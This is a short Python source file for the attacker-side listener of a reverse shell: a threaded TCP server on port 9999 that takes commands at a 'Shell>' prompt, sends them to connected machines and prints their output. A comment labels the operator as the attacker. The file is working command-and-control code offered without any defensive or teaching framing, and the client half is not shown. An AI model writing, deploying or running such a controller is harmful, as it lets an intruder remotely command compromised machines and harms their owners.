import socket
import threading
from utils import log_activity

# Server configuration
HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 9999       # Port to listen on

def handle_client(client_socket):
    log_activity(f"Connection established with {client_socket}")
    while True:
        command = input("Shell> ")  # Attacker inputs commands
        if command.lower() == "exit":
            break
        client_socket.send(command.encode())  # Send command to client
        response = client_socket.recv(4096).decode()  # Receive response from client
        print(response)
    client_socket.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"Server listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"Accepted connection from {addr}")
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

if __name__ == "__main__":
    start_server()
